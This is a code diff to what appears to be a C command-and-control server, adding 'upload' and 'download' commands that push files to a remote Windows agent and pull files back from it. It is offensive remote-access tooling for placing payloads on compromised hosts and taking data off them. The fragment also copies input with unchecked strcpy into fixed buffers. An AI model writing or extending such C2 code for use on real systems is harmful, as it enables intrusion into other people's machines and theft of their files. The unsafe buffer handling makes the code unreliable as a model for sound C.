@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <fcntl.h>
+#include <libgen.h>
 #include "c2_modules.h"
 
 #define BUFFER_SIZE 2048
@@ -111,6 +112,62 @@ int main(void){
 		else if ( strncmp(cmd,"terminate",9) == 0){
 			printf("going to Handle func\n");
 			HandleStopProcess(cmd,client_socket);
+			continue;
+		}
+		else if ( strncmp(cmd,"upload",6) == 0){	//uploading should have two arguments : the local file and the desired folder
+			printf("going to Handle func\n");
+			// Parse the buffer
+			char cmd_copy[BUFFER_SIZE];
+			strcpy(cmd_copy,cmd);
+			char* space_pos_upload = strchr(cmd_copy, ' ');
+			if (space_pos_upload == NULL) {
+				continue;
+			}
+			printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+			// 
+			// will use basename() to get the filename to write with linux fs bullshit
+			
+
+
+			char remainder_copy[1024];
+			strcpy(remainder_copy, space_pos_upload + 1);
+			
+
+			// First token is the filename
+			char * FileNameToUpload  = basename(strtok(remainder_copy, " "));
+			if (FileNameToUpload == NULL) {
+			    printf("[x] Missing filename\n");
+			    continue;
+			}
+
+			// Second token is the Windows path
+			char* FullWindowsPath = strtok(NULL, "\0");  // Get everything until newline
+			if (FullWindowsPath == NULL) {
+			    printf("[x] Missing Windows path\n");
+			    continue;
+			}
+
+
+
+			printf("[+] The file with basename() is %s\n",FileNameToUpload);
+			printf("[+] The folder to download into is %s\n",FullWindowsPath);
+			UploadFile(cmd,client_socket,FileNameToUpload,FullWindowsPath);		//Server will send, agent will receive
+			continue;
+		}
+		else if ( strncmp(cmd,"download",9) == 0){
+			printf("going to Handle func\n");
+			// Parse the buffer
+			char* space_pos_download = strchr(cmd, ' ');
+			if (space_pos_download == NULL) {
+				continue;
+			}
+			printf("[+] THE file to be downloaded is %s\n", space_pos_download + 1);		//DEBUG
+			// 
+			// will use basename() to get the filename to write with linux fs bullshit
+			char * FileNameToDownload = basename(space_pos_download + 1);
+
+			printf("[+] The file with basename() is %s\n",FileNameToDownload);
+			//DownloadFile(cmd,client_socket,FileNameToDownload);	//Server will receive, agent will send
 			continue;
 		}
 
